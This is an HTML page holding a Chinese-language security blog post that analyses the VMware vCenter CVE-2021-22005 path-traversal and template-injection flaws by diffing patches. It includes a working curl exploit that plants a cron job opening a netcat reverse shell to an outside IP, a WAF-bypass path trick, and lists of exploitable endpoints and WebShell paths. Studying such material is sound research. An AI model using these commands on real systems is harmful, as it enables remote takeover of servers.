@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="VMware vCenter漏洞分析（二）"/><meta name="keywords" content="research,analyze" /><link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="https://hosch3n.github.io/2021/10/08/VMware-vCenter漏洞分析（二）/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180953397-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-180953397-1');
+</script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>VMware vCenter漏洞分析（二） - Blog</title>
+  <meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">首页
+          </li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签
+          </li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Blog</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            首页
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            标签
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/categories/">
+            分类
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            关于
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">VMware vCenter漏洞分析（二）
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2021-10-08
+        </span><span class="post-category">
+            <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-22005"><span class="toc-text">CVE-2021-22005</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AsyncTelemetryController%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">AsyncTelemetryController漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DataAppAgentController%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">DataAppAgentController漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h2 id="CVE-2021-22005"><a href="#CVE-2021-22005" class="headerlink" title="CVE-2021-22005"></a>CVE-2021-22005</h2><p>Analytics服务相关端点存在目录穿越写文件，可将</p>
+<p>影响版本：</p>
+<ul>
+<li>7.0 &lt;= vCenter Server &lt; 7.0 U2c</li>
+<li>6.7 &lt;= vCenter Server &lt; 6.7 U3o</li>
+</ul>
+<p>利用链1：<code>curl -k -X POST &#39;https://1.1.1.1/analytics/telemetry/ph/api/hyper/send?_c=&amp;_i=/../../../../../../etc/cron.d/syslog&#39; -d &#39;* * * * * root nc -e /bin/sh 2.2.2.2 1337&#39; -H &#39;Content-Type: application/json&#39;</code></p>
+<p>利用链2：<a target="_blank" rel="noopener" href="https://gist.github.com/testanull/5bb925179c4695e51ca400b7370bc252">asdklajsdlkajsdlkajsdakjsdhalskdasdioasiodaklsd.py</a></p>
+<h3 id="AsyncTelemetryController漏洞分析"><a href="#AsyncTelemetryController漏洞分析" class="headerlink" title="AsyncTelemetryController漏洞分析"></a>AsyncTelemetryController漏洞分析</h3><p>vCenter在9月更新修复了一堆漏洞，由官方发布的<a target="_blank" rel="noopener" href="https://kb.vmware.com/s/article/85717">CVE-2021-22005缓解措施</a>可以知道漏洞所在服务与Web路径：</p>
+<p><img src="/img/vcenterldfxb_a.png"></p>
+<p>对应路径的rhttpproxy策略在vCenter各版本中也不尽相同：</p>
+<p><img src="/img/vcenterldfxb_b.png"></p>
+<p>下载漏洞修复前后的两个补丁（VMware-vCenter-Server-Appliance-6.7.0.48000-18010531-patch-FP.iso、VMware-vCenter-Server-Appliance-6.7.0.50000-18485166-patch-FP.iso）并解压VMware-analytics的rpm包，反编译对比相关jar包：</p>
+<p><img src="/img/vcenterldfxb_c.png"></p>
+<p>对<code>/ph/api/hyper/send</code>路径的<code>_v</code>、<code>_c</code>、<code>_i</code>请求参数分别绑定给<code>version</code>、<code>collectorId</code>、<code>collectorInstanceId</code>变量，随后调用存在补丁变动的<code>handleSendRequest</code>方法，添加了对传入变量的白名单校验。<code>AsyncTelemetryController</code>类的另一处补丁变动类似，在<code>handleGetLevelRequest</code>方法添加了白名单校验。</p>
+<p><img src="/img/vcenterldfxb_d.png"></p>
+<p>跟进<code>TelemetryService</code>接口相应的具体实现，之前组装好的<code>TelemetryRequest</code>对象被加入了线程池异步调用。在<code>/etc/vmware-analytics/ph-telemetry-prod.xml</code>找到bean相关类。</p>
+<p><img src="/img/vcenterldfxb_e.png"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;phProdTelemetryService&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.push.telemetry.internal.impl.AsyncTelemetryServiceWrapper&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">destroy-method</span>=<span class="string">&quot;close&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.push.telemetry.TelemetryLevelBasedTelemetryServiceWrapper&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phProdLogTelemetryService&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phProdCeipTelemetryLevelService&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;phProdLogTelemetryService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.push.telemetry.LogTelemetryService&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;targetObject&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phLogTelemetryBaseDir&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;targetMethod&quot;</span> <span class="attr">value</span>=<span class="string">&quot;resolve&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;arguments&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;ph.telemetry.logdir.prod&#125;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phLog4j2Context&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;phProdCeipTelemetryLevelService&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.push.telemetry.DefaultTelemetryLevelService&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phCeipConfigProvider&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.common.internal.manifest.PropertyControlledManifestContentProviderWrapper&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phConfigurationService&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;phservices.manifest_location&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.common.ph.PhManifestContentProvider&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">&quot;phProdTelemetryLevelServicePhClientFactory&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;ph.telemetry.level.cache.expiration_interval.millis&#125;&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;3&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;ph.telemetry.level.cache_size&#125;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>动态调试套路与之前一样，配置文件在<code>/etc/vmware/vmware-vmon/svcCfgfiles/analytics.json</code>，改完重启服务<code>service-control --restart vmware-analytics</code></li>
+</ul>
+<p><code>TelemetryLevelBasedTelemetryServiceWrapper</code>类<code>processTelemetry</code>方法会调用<code>DefaultTelemetryLevelService</code>类<code>getTelemetryLevel</code>方法获取<code>telemetryLevel</code>。</p>
+<p><img src="/img/vcenterldfxb_f.png"></p>
+<p>继续跟进看到需要<code>isCeipEnabled</code>不为默认值<code>false</code>才会继续流程：</p>
+<p><img src="/img/vcenterldfxb_g.png"></p>
+<p>随后调用<code>LogTelemetryService</code>类<code>processTelemetry</code>方法，利用log4j写日志文件至<code>/var/log/vmware/analytics/prod/</code>目录，文件内容为POST请求体数据。</p>
+<p><img src="/img/vcenterldfxb_h.png"></p>
+<p>很自然地想到之前21972目录穿越写文件，不同的是此时存在json后缀名，不能直接写WebShell；也要注意到我们此时是root而非vsphere-ui用户，可以写计划任务。但是构造<code>/../</code>后<code>_c_i</code>目录不存在，导致目录穿越报错：</p>
+<p><img src="/img/vcenterldfxb_i.png"></p>
+<p>可以先发送<code>_i=/any</code>，利用<code>createManager</code>方法的<code>FileUtils.makeParentDirs</code>将<code>_c_i</code>目录创建出来，随后再由目录穿越写计划任务反弹shell。</p>
+<p><img src="/img/vcenterldfxb_j.png"></p>
+<h3 id="DataAppAgentController漏洞分析"><a href="#DataAppAgentController漏洞分析" class="headerlink" title="DataAppAgentController漏洞分析"></a>DataAppAgentController漏洞分析</h3><p>对比官方验证脚本的另一处路径对应jar包，<code>/dataapp/agent</code>路径的<code>action=collect</code>相关代码被整段移除：</p>
+<p><img src="/img/vcenterldfxb_k.png"></p>
+<p>跟进<code>collect</code>方法后经历了各种类方法跳转，将POST请求体中JSON的<code>manifestContent</code>参数值解析后，作为<code>VelocityHelper.executeVelocityExpression</code>方法的入参<code>this._mappingCode</code>。</p>
+<p><img src="/img/vcenterldfxb_l.png"></p>
+<p>接着带入<code>VelocityEngine</code>类<code>evaluate</code>方法作为模板语句动态执行：</p>
+<p><img src="/img/vcenterldfxb_m.png"></p>
+<ul>
+<li>不同版本的Velocity方法名略有不同</li>
+</ul>
+<p>最终 @testbnull 发现可以通过上下文可用的<code>$GLOBAL-logger</code>，利用<code>setFile</code>方法临时修改日志路径到Web路径的方式，写入WebShell实现RCE。</p>
+<p><img src="/img/vcenterldfxb_n.png"></p>
+<p><img src="/img/vcenterldfxb_o.png"></p>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>由于Tomcat会将<code>/..;/</code>视作<code>/../</code>，可以利用该特性绕过vCenter某些版本的rhttpproxy的访问限制，也可以用来绕过某些WAF的简单规则。</p>
+<ul>
+<li><code>/analytics/cloudhealth/sdk/..;/..;/ph/api/xxx</code></li>
+</ul>
+<p>漏洞利用还有如下路径可供参考，但我没有仔细测试各个版本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;analytics&#x2F;ceip&#x2F;sdk</span><br><span class="line">&#x2F;analytics&#x2F;ceip&#x2F;api&#x2F;state</span><br><span class="line">&#x2F;analytics&#x2F;healthstatus</span><br><span class="line">&#x2F;analytics&#x2F;resourcebundle</span><br><span class="line">&#x2F;analytics&#x2F;telemetry&#x2F;ph&#x2F;api&#x2F;hyper&#x2F;send</span><br><span class="line">&#x2F;analytics&#x2F;telemetry&#x2F;ph-stg&#x2F;api&#x2F;hyper&#x2F;send</span><br><span class="line">&#x2F;analytics&#x2F;telemetry&#x2F;ph&#x2F;api&#x2F;level</span><br><span class="line">&#x2F;analytics&#x2F;telemetry&#x2F;ph-stg&#x2F;api&#x2F;level</span><br></pre></td></tr></table></figure>
+
+<p>对<code>/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/</code>下的WebShell也需要利用路径穿越访问，用得最多的是<code>/idm/..;/shell.jsp</code>，还有如下访问路径可供参考：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;sso-adminserver&#x2F;idp</span><br><span class="line">&#x2F;sso-adminserver&#x2F;sdk</span><br><span class="line">&#x2F;sts&#x2F;STSService</span><br><span class="line">&#x2F;websso</span><br><span class="line">&#x2F;lookupservice</span><br><span class="line">&#x2F;openidconnect</span><br><span class="line">&#x2F;afd</span><br><span class="line">&#x2F;lookup</span><br><span class="line">&#x2F;vmdir</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.vmware.com/security/advisories/VMSA-2021-0020.html">VMSA-2021-0020.1</a></p>
+<p><a target="_blank" rel="noopener" href="https://censys.io/blog/vmware-cve-2021-22005-technical-impact-analysis/">VMware CVE-2021-22005 Technical &amp; Impact analysis</a></p>
+<p><a target="_blank" rel="noopener" href="https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee">Quick note of vCenter RCE (CVE-2021–22005)</a></p>
+
+      </div>
+      
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/tags/ESXI/">ESXI</a>
+            <a href="/tags/VCSA/">VCSA</a>
+            <a href="/tags/CVE-2021-22005/">CVE-2021-22005</a>
+            <a href="/tags/CVE-2021-22006/">CVE-2021-22006</a>
+            <a href="/tags/CVE-2021-22017/">CVE-2021-22017</a>
+            </div>
+        
+        <nav class="post-nav"><a class="prev" href="/2021/11/02/Artifact%E9%9B%86%E6%88%90Syscall%E4%B8%8EDetours/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">Artifact集成Syscall与Detours</span>
+        <span class="prev-text nav-mobile">上一篇</span>
+      </a>
+    <a class="next" href="/2021/08/24/ProxyShell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        <span class="next-text nav-default">ProxyShell漏洞分析</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:hosch3n@protonmail.com" class="iconfont icon-email" title="email"></a>
+        <a target="_blank" rel="noopener" href="https://github.com/hosch3n" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2021 - 2022<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">hosch3n</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
